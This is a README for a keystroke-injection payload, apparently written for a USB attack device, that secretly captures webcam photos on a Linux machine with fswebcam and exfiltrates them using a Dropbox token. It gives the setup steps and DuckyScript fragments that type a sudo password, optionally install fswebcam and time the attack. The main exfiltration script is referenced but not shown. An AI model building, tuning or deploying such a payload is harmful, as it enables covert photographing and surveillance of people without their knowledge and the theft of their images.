# Exfiltrate Photos Through Shell - Linux ✅

A script used to exfiltrate photos using fswebcam shell command.

**Category**: Exfiltration

## Description

A script used to exfiltrate photos using fswebcam shell command. The permissions is needed for give the executation permission to the script downloaded.

## Getting Started

### Dependencies

* An internet connection
* Linux system
* Dropbox Token, or whatever you want, for the exfiltration
* sudo permission
* 'fswebcam' installed but you can install it with the payload

### Executing program

* Plug in your device

### Settings

* Dropbox Token - You should change it into the script.sh file, line 7.

```Python
TOKEN=your_dropbox_token
```

* This section of sudo time depends by the computer power on which it runs. So if you know that the computer on which you run the payload is too slow, increase it by a few seconds, otherwise you can try running it as it is (so 5000) set now or smaller depending on your needs.

```DuckyScript
STRING SUDO-PSWD
ENTER
REM DELAY Based On Computer Power
DELAY 5000
```

* If you want to install the fswebcam dependency, you should uncomment it. This DELAY (so 5000), like the previous one, is dynamic and in this case relies on the power of the Internet.

```DuckyScript
REM STRING apt install fswebcam -y
REM ENTER
REM DELAY Based On Internet Power
REM DELAY 5000
```

* Generally does not need much time

```DuckyScript
REM DELAY Based On Internet Power
DELAY 4000
```
